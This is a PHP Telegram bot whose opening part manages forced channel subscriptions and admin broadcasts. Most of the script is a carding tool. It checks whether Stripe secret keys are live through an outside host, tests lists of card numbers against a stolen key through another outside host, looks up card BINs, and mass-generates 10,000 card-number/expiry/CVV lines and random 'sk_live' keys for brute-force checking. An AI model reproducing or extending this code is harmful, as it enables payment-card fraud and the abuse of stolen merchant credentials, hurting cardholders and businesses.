<?php
ob_start();
define('API_KEY', 'توكن');
echo "https://api.telegram.org/bot" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME'];

function bot($method, $datas = [])
  {
  $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
  $res = curl_exec($ch);
  if (curl_error($ch))
    {
    var_dump(curl_error($ch));
    }
    else
    {
    return json_decode($res);
    }
  }

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
$name = $update->message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$ch = "@TDDDD2"; //قناتك


$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$ch&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"• عـذراََ ! 

• يجب عليك الاشتراك في قناة اولا
⚙|  الغرض من اشتراكك في القناه ليس ربحي  ولكن  لتستطيع فهم البوت اكثر  لا غير

• القناة 🥤:- $ch

عند الاشتراك بالقناة ارسل /start ",
]);return false;}
$T4TTTT = 664844521; //ايديك
$SAIED = file_get_contents("SAIED.txt");
$SAIED0 = file_get_contents("SAIED0.txt");
$SAIED1= file_get_contents("SAIED1.txt");
$SAIED5 = file_get_contents("SAIED2.txt");
$SAIED6 = file_get_contents("SAIED3.txt");
$SAIED20 = json_decode(file_get_contents('php://input'));
$SAIED18 = $update->message;
$SAIED13 = $SAIED18->chat->id;
$SAIED17 = $SAIED18->text;
$SAIED19 = $SAIED20->callback_query->data;
$SAIED12 = $SAIED20->callback_query->message->chat->id;
$SAIED14 =  $SAIED20->callback_query->message->message_id;
$SAIED15 = $SAIED18->from->first_name;
$SAIED16 = $SAIED18->from->username;
$SAIED11 = $SAIED18->from->id;
$SAIED2 = explode("\n",file_get_contents("SAIED4.txt"));
$SAIED3 = count($SAIED2)-1;
if ($SAIED18 && !in_array($SAIED11, $SAIED2)) {
    file_put_contents("SAIED4.txt", $SAIED11."\n",FILE_APPEND);
  }
$SAIED9 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$SAIED0&user_id=".$SAIED11);
$SAIED10 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$SAIED1&user_id=".$SAIED11);
if($SAIED18 && (strpos($SAIED9,'"status":"left"') or strpos($SAIED9,'"Bad Request: USER_ID_INVALID"') or strpos($SAIED9,'"status":"kicked"') or strpos($SAIED10,'"status":"left"') or strpos($SAIED10,'"Bad Request: USER_ID_INVALID"') or strpos($SAIED10,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$SAIED13,
'text'=>'- اشترك في قنوات البوت أولا لتتمكن من إستخدامه 🤖".

'.$SAIED0.'
'.$SAIED1,
]);return false;}
if($SAIED17 == "/admin" and $SAIED11 == $T4TTTT){
bot("sendmessage",[
"chat_id"=>$SAIED13,
"text"=>'- أهلا بك في قائمة المطور 👨🏻‍✈️".',
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'- أوامر قناة الإشتراك الإجباري الأولى 📡1⃣".' ,'callback_data'=>"SAIED"]],
[['text'=>'- وضع قناة 📡✅".' ,'callback_data'=>"SAIED0"],['text'=>'- حذف القناة 📡❎".' ,'callback_data'=>"SAIED1"]],
[['text'=>'- أوامر قناة الإشتراك الإجباري الثانية 📢2⃣".' ,'callback_data'=>"SAIED"]],
[['text'=>'- وضع قناة 📢✅".' ,'callback_data'=>"SAIED2"],['text'=>'- حذف القناة 📢❎".' ,'callback_data'=>"SAIED3"]],
[['text'=>'- عرض قنوات الإشتراك الإجباري 📜".' ,'callback_data'=>"SAIED4"]],
[['text'=>'- أوامر الإذاعة 🗣".' ,'callback_data'=>"SAIED"]],
[['text'=>'- نشر توجيه ↪️".' ,'callback_data'=>"SAIED5"],['text'=>'- نشر رسالة 📝".' ,'callback_data'=>"SAIED6"]],
[['text'=>'- عدد المشتركين 👥".' ,'callback_data'=>"SAIED7"]],
[['text'=>'- التنبيه عند دخول أحد للبوت 🚸".' ,'callback_data'=>"SAIED"]],
[['text'=>'- تفعيل التنبيه 🚸✅".' ,'callback_data'=>"SAIED9"],['text'=>'- تعطيل التنبيه 🚸❎".' ,'callback_data'=>"SAIED10"]],
[['text'=>'- توجيه الرسائل من الأعضاء 🔃".' ,'callback_data'=>"SAIED"]],
[['text'=>'- تفعيل للتوجيه 🔃✅".' ,'callback_data'=>"SAIED11"],['text'=>'- تعطيل للتوجيه 🔃❎".' ,'callback_data'=>"SAIED12"]],
   ] 
   ])
]);
}
if($SAIED19 == "SAIED" ){
bot('EditMessageText',[
'chat_id'=>$SAIED12,
'message_id'=>$SAIED14,
"text"=>'- أهلا بك في قائمة المطور 👨🏻‍✈️".',
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'- أوامر قناة الإشتراك الإجباري الأولى 📡1⃣".' ,'callback_data'=>"SAIED"]],
[['text'=>'- وضع قناة 📡✅".' ,'callback_data'=>"SAIED0"],['text'=>'- حذف القناة 📡❎".' ,'callback_data'=>"SAIED1"]],
[['text'=>'- أوامر قناة الإشتراك الإجباري الثانية 📢2⃣".' ,'callback_data'=>"SAIED"]],
[['text'=>'- وضع قناة 📢✅".' ,'callback_data'=>"SAIED2"],['text'=>'- حذف القناة 📢❎".' ,'callback_data'=>"SAIED3"]],
[['text'=>'- عرض قنوات الإشتراك الإجباري 📜".' ,'callback_data'=>"SAIED4"]],
[['text'=>'- أوامر الإذاعة 🗣".' ,'callback_data'=>"SAIED"]],
[['text'=>'- نشر توجيه ↪️".' ,'callback_data'=>"SAIED5"],['text'=>'- نشر رسالة 📝".' ,'callback_data'=>"SAIED6"]],
[['text'=>'- عدد المشتركين 👥".' ,'callback_data'=>"SAIED7"]],
[['text'=>'- التنبيه عند دخول أحد للبوت 🚸".' ,'callback_data'=>"SAIED"]],
[['text'=>'- تفعيل التنبيه 🚸✅".' ,'callback_data'=>"SAIED9"],['text'=>'- تعطيل التنبيه 🚸❎".' ,'callback_data'=>"SAIED10"]],
[['text'=>'- توجيه الرسائل من الأعضاء 🔃".' ,'callback_data'=>"SAIED"]],
[['text'=>'- تفعيل للتوجيه 🔃✅".' ,'callback_data'=>"SAIED11"],['text'=>'- تعطيل للتوجيه 🔃❎".' ,'callback_data'=>"SAIED12"]],
   ] 
   ])
]);
unlink("SAIED.txt");
}
if($SAIED19 == "SAIED0"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- أرسل معرف القناة الآن Ⓜ️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- إلغاء ❌".' ,'callback_data'=>"SAIED"]],
]])
]);
file_put_contents("SAIED.txt","SAIED0");
}
if($SAIED17 and $SAIED == "SAIED0" and $SAIED11 == $T4TTTT){
bot("sendmessage",[
"chat_id"=>$SAIED13,
"text"=>'- تم حفظ معرف القناة بنجاح ✅".

- تأكد من أن البوت أدمن في القناة ليتم تفعيل الإشتراك الإجباري 👨🏻‍✈️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
file_put_contents("SAIED0.txt","$SAIED17");
unlink("SAIED.txt");
}
if($SAIED19 == "SAIED1"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- تم حذف القناة بنجاح ✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
unlink("SAIED.txt");
unlink("SAIED0.txt");
}
if($SAIED19 == "SAIED2"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- أرسل معرف القناة الآن Ⓜ️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- إلغاء ❌".' ,'callback_data'=>"SAIED"]],
]])
]);
file_put_contents("SAIED.txt","SAIED1");
}
if($SAIED17 and $SAIED == "SAIED1" and $SAIED11 == $T4TTTT){
bot("sendmessage",[
"chat_id"=>$SAIED13,
"text"=>'- تم حفظ معرف القناة بنجاح ✅".

- تأكد من أن البوت أدمن في القناة ليتم تفعيل الإشتراك الإجباري 👨🏻‍✈️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
file_put_contents("SAIED1.txt","$SAIED17");
unlink("SAIED.txt");
}
if($SAIED19 == "SAIED3"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- تم حذف القناة بنجاح ✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
unlink("SAIED.txt");
unlink("SAIED1.txt");
}
if($SAIED19 == "SAIED4"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- هذه هي قائمة قنوات الإشتراك الإجباري 📜".

- القناة الأولى '.$SAIED0.' 📡".

- القناة الثانية '.$SAIED1.' 📢".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
unlink("SAIED.txt");
}
if($SAIED19 == "SAIED5"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- أرسل رسالتك ليتم نشرها توجيه لجميع الأعضاء ↪️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- إلغاء ❌".' ,'callback_data'=>"SAIED"]],
]])
]);
file_put_contents("SAIED.txt","SAIED2");
}
if($SAIED18 and $SAIED == "SAIED2" and $SAIED11 == $T4TTTT){
bot("sendmessage",[
"chat_id"=>$SAIED13,
"text"=>'- تم التوجيه بنجاح ✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
for($i=0;$i<count($SAIED2); $i++){
bot('forwardMessage', [
'chat_id'=>$SAIED2[$i],
'from_chat_id'=>$SAIED11,
'message_id'=>$SAIED18->message_id
]);
unlink("SAIED.txt");
}
}
if($SAIED19 == "SAIED6"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- أرسل رسالتك ليتم نشرها رسالة لجميع الأعضاء 📝".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- إلغاء ❌".' ,'callback_data'=>"SAIED"]],
]])
]);
file_put_contents("SAIED.txt","SAIED3");
}
if($SAIED17 and $SAIED == "SAIED3" and $SAIED11 == $T4TTTT){
bot("sendmessage",[
"chat_id"=>$SAIED13,
"text"=>'- تم النشر بنجاح ✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
for($i=0;$i<count($SAIED2); $i++){
bot('sendMessage', [
'chat_id'=>$SAIED2[$i],
'text'=>$SAIED17
]);

unlink("SAIED.txt");
}
}
if($SAIED19 == "SAIED7"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- عدد مشتركين البوت هو '.$SAIED3.' 👥".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
unlink("SAIED.txt");
}
if($SAIED19 == "SAIED9"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- تم تفعيل تنبيه دخول الأعضاء 🚸✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
file_put_contents("SAIED2.txt","SAIED");
}
if($SAIED17 == "/start" and $SAIED5 == "SAIED" and $SAIED11 != $T4TTTT){
bot("sendmessage",[
"chat_id"=>$T4TTTT,
"text"=>'- دخل شخص إلى البوت 🚶‍♂".

- اسمه '.$SAIED15.' 🔠".

- معرفه '.$SAIED16.' Ⓜ️".

- ايديه '.$SAIED11.' 🆔".',
]);
}
if($SAIED19 == "SAIED10"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- تم تعطيل تنبيه دخول الأعضاء 🚸❎".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
unlink("SAIED.txt");
unlink("SAIED2.txt");
}
if($SAIED19 == "SAIED11"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- تم تفعيل توجيه الرسائل 🔃✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
file_put_contents("SAIED3.txt","SAIED");
}
if($SAIED18 and $SAIED6 == "SAIED" and $SAIED11 != $T4TTTT){
bot('forwardMessage', [
'chat_id'=>$T4TTTT,
'from_chat_id'=>$SAIED11,
'message_id'=>$SAIED18->message_id
]);
}
if($SAIED18 and $SAIED6 == "SAIED" and $SAIED11 == $T4TTTT){
bot('sendMessage',[
'chat_id'=>$SAIED18->reply_to_message->forward_from->id,
    'text'=>$SAIED17,
    ]);
}
if($SAIED19 == "SAIED12"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>'- تم تعطيل توجيه الرسائل 🔃❎".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- BACK ↪️ ↩️".' ,'callback_data'=>"SAIED"]],
]])
]);
unlink("SAIED.txt");
unlink("SAIED3.txt");
}
mkdir("tool");
$id = $message->from->id;
$admin = 2031853665; //your id
if (preg_match('/^\/(h)(.*)/', $text) and $id == $admin) {
    $text = str_replace('/h','',$text);
    $ex = explode(' ', $text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"the id  $ex[1]  added successfully 
",
]);
file_put_contents("tool/$ex[1].txt",$ex[1]);
}
if (preg_match('/^\/(D)(.*)/', $text) and $id ==$admin) {
    $text = str_replace('/D','',$text);
    $ex = explode(' ', $text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"the  $ex[1] removed successfully 
",
]);
file_put_contents("tool/$ex[1].txt","medo");
}
 $gt =file_get_contents("tool/$id.txt");
 if($text and $gt !=$id){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"You need to subscribe to the bot
To subscribe, contact the developer.", 
'parse_mode'=>"MarkDown",
'disable_web_page_preview' =>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
    [['text'=>"Connect with the developer",'url'=>"t.me/FjFFFF"]]
]
])
]);
exit;
}

$getsk2 = file_get_contents("$chat_id2/sk.txt");
$getsk = file_get_contents("$chat_id/sk.txt");
if($text =='/start'){
mkdir("$chat_id");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Choose one of the buttons',
'parse_mode'=>"html",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>'List 📃','callback_data'=>'list']],
[['text'=>'Check 🔎','callback_data'=>'check']],
[['text'=>'SK 🏷','callback_data'=>'sk']],

]]) 

]);
} 
if($data =='back'){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$SAIED14,
'text'=>'Choose one of the buttons',
'parse_mode'=>"html",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>'List 📃','callback_data'=>'list']],
[['text'=>'Check🔎','callback_data'=>'check']],
[['text'=>'SK  🏷','callback_data'=>'sk']],

]]) 
]);
file_put_contents("$chat_id/status.txt","0");
} 
if($data =='check'){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$SAIED14,
'text'=>'Choose one of the buttons. ',
'parse_mode'=>"html",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>'Check SK 🏷','callback_data'=>'skchecker']],
[['text'=>'Check visa 💳','callback_data'=>'visacheck']],
[['text'=>'Check BIN 🟢','callback_data'=>'binschecker']], 
[['text'=>'BACK ↪️','callback_data'=>'back']],
]]) 

]);
}  
if($data =='sk'){
mkdir("$chat_id2");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$SAIED14,
'text'=>'If you add Sk press back',
'parse_mode'=>"html",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>'add Sk ➕','callback_data'=>'1']],
[['text'=>'Delete the old SK 🗑','callback_data'=>'Del']],
[['text'=>'Get Your SK 📤','callback_data'=>'get']],
[['text'=>'back ↪️','callback_data'=>'back']],
]]) 

]);
} 
if($data =="Del"){
bot('sendMessage',[
'chat_id'=>$chat_id2,
'text'=>'The old sk has been deleted', 
]);
file_put_contents("$chat_id2/sk.txt","0");
exit;} 
if($data =="get" and $getsk2 =="No Sk added"){
	bot('sendMessage',[
'chat_id'=>$chat_id2,
'text'=>"You didn't add sk.",
]);
exit;
}
if($data =="get" and $getsk2 =="0"){
	bot('sendMessage',[
'chat_id'=>$chat_id2,
'text'=>"You didn't add sk.",
]);
exit;
} 
if($data =="get"){ 
	$skk = file_get_contents("http://grooty.net/skcheck.php?sk=" . $getsk2 . "&referrer=Tikol4Life");
bot('sendMessage',[
'chat_id'=>$chat_id2,
'text'=>"$getsk2


Result : $skk
",
'parse_mode'=>"html",
]);
exit;} 
if($data =="1" ){
file_put_contents("$chat_id2/sk.txt","No Sk added");
bot('sendMessage',[
'chat_id'=>$chat_id2,
'text'=>'Send Sk', 
]);exit;} 
$skk = file_get_contents("http://grooty.net/skcheck.php?sk=" . $text . "&referrer=Tikol4Life");
if($text  and $text !='/start' and $getsk =="No Sk added"){
if($skk =="DEAD"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'THIS SK IS DEAD',
]);
file_put_contents("$chat_id/sk.txt","0");
}}
if($text  and $text !='/start' and $getsk =="No Sk added"){
if($skk =="LIVE"){
file_put_contents("$chat_id/sk.txt",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Done Added sk',
]);
}}
if($data =="1" and $getsk2 !="No Sk added" and $getsk2 !="0"){
bot('sendMessage',[
'chat_id'=>$chat_id2,
'text'=>"You've added sk before. ", 
]);
exit;
}
$status = file_get_contents("$chat_id/status.txt");
if($data =='skchecker'){
file_put_contents("$chat_id2/status.txt","NOWSENDSK");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$SAIED14,
'text'=>'No Send Sk To Checker',
'parse_mode'=>"html",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>'BACK ↪️','callback_data'=>'back']],
]]) 
]);
}
if($data =='binschecker'){
	file_put_contents("$chat_id2/status.txt","NOWSENDBIN");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$SAIED14,
'text'=>'No Send ONE BIN To Checker
*DO NOT SEND LIST*', 
   'parse_mode'=>'MarkDown',
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>'BACK ↪️','callback_data'=>'back']],
]]) 
]);
}
if($text !='/start' and $status =="NOWSENDSK"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>'wait ⏱️'
]);
$url = file_get_contents("http://grooty.net/skcheck.php?sk=" . $text . "&referrer=Tikol4Life");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>" This SK is $url", 
]);
file_put_contents("$chat_id/status.txt","0");
} 

if($text !='/start' and $status =="NOWSENDBIN"){
	$url = file_get_contents("https://lookup.binlist.net/" . $text);
$scheme = json_decode($url)->scheme;
$type = json_decode($url)->type;
$name = json_decode($url)->country->name;
$emoji = json_decode($url)->country->emoji;
$prepaid = json_decode($url)->prepaid;
$bank = json_decode($url)->bank->name;
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
𝒔𝒄𝒉𝒆𝒎𝒆 → $scheme
𝒕𝒚𝒑𝒆  →  $type
𝒑𝒓𝒆𝒑𝒂𝒊𝒅  → $prepaid
𝒄𝒐𝒖𝒏𝒕𝒓𝒚 → $name $emoji 
𝒃𝒂𝒏𝒌 𝒏𝒂𝒎𝒆 → $bank
",
'reply_to_message_id'=>$message->message_id,
]);
file_put_contents("$chat_id/status.txt","0");
} 
$statuss = file_get_contents("$chat_id/sk.txt");
$url == file_get_contents("http://grooty.net/skcheck.php?sk=" . $statuss . "&referrer=Tikol4Life"); 
if($text !='/start' and $status =="NOWSENDVISA"){ 
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"wait ⏱️

", 
]);
$b = "";
$email = explode("\n", $text);
for ($i=0; $i < count($email); $i++) {
$url = file_get_contents("https://tzzzzava.xyz/Apis/visabysk1.php?visa=" . $email[$i] . "&sk=" . $statuss);
$b = $b."$url : $email[$i]\n";
        }
 bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"$b

", 
]);
file_put_contents("$chat_id/status.txt","0");
}
if($data =='visacheck' ){
	$getsk2 = file_get_contents("$chat_id2/sk.txt");
$skk = file_get_contents("http://grooty.net/skcheck.php?sk=" . $getsk2  . "&referrer=Tikol4Life" );

	 $membercall = $update->callback_query->id;
bot('answercallbackquery', [
            'callback_query_id' =>$membercall,
            'text' => "⚠️HINT ^ Your SK is : $skk", 
            'parse_mode'=>"html",
            'show_alert' =>true,
       ]);}
if($data =='visacheck'){
	$stjatuss = file_get_contents("$chat_id2/sk.txt");
file_put_contents("$chat_id2/status.txt","NOWSENDVISA");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$SAIED14,
'text'=>"No Send VISA To Checker
*Your SK IS - $skk*",
'parse_mode'=>"markdown",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>'BACK ↪️','callback_data'=>'back']],
]]) 
]);
}
if($data =='list'){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$SAIED14,
'text'=>'Choose one of the buttons. ',
'parse_mode'=>"html",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>'List SK 🏷','callback_data'=>'listsk']],
[['text'=>'List visa 💳','callback_data'=>'listvisa']],
[['text'=>'BACK ↪️','callback_data'=>'back']],
]]) 

]);
} 
if($data =='listvisa'){
 $membercall = $update->callback_query->id;
bot('answercallbackquery', [
            'callback_query_id' =>$membercall,
            'text' => "⏰ WAIT PLEASE ⏰",
            'show_alert' =>false
       ]);
$p = "";
for ($i=0; $i < 10000; $i++) {
$u=explode("\n",file_get_contents("bins.txt"));
$T=array_rand($u,1);
$Y=$u[$T];
$v10 = substr(str_shuffle( '1234567890'),0,10);
$v1 = substr(str_shuffle( '123456789'),0,1);
$v3 = substr(str_shuffle( '123456789'),0,1);
$v4 = substr(str_shuffle( '123456789'),0,3);
$url = "$Y$v10|0$v3|202$v1|$v4";
$p = $p."$url\n";
}
$rand = rand(1,9999999);
$c = "$rand.txt";
file_put_contents("$c","$p");
bot('sendDocument',[
 'chat_id'=>$chat_id2,
 'document'=>new CURLFile($c), 
'caption'=>"تم صنع لسته فيز   
عدد الفيز بالملف  : 10000", 
]);
unlink("$c");
}
if($data =='listsk'){
 $membercall = $update->callback_query->id;
bot('answercallbackquery', [
            'callback_query_id' =>$membercall,
            'text' => "⏰ WAIT PLEASE ⏰",
            'show_alert' =>false
       ]);
$p = "";
for ($i=0; $i < 10000; $i++) {
$n = substr(str_shuffle( 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890qwertyuiopkljhgfdsazxcvbnmABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890qwertyuiopkljhgfdsazxcvbnm'),0,97);
$sk = "sk_live_51";
$url = "$sk$n";
$p = $p."$url\n";
}
$rand = rand(1,9999999);
$c = "$rand.txt";
file_put_contents("$c","$p");
bot('sendDocument',[
 'chat_id'=>$chat_id2,
 'document'=>new CURLFile($c), 
'caption'=>"تم صنع لسته فيز   
عدد الفيز بالملف  : 10000", 
]);
unlink("$c");
}